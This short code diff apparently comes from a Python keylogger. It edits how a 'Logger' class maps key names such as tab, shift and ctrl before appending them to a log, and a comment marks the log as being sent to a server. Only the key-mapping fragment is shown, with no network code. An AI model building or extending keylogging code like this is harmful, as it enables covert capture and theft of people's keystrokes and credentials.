@@ -20,10 +20,8 @@ class Logger():
       key = "\n"
     elif key == "space":
       key = " "
-    elif key == "tab":
+    elif key == "tab" or key == "shift" or key == "ctrl":
       key = ""
-    elif key == "shift":
-      key = "" 
     #Logging and sending to server
     self.log += key
     try:
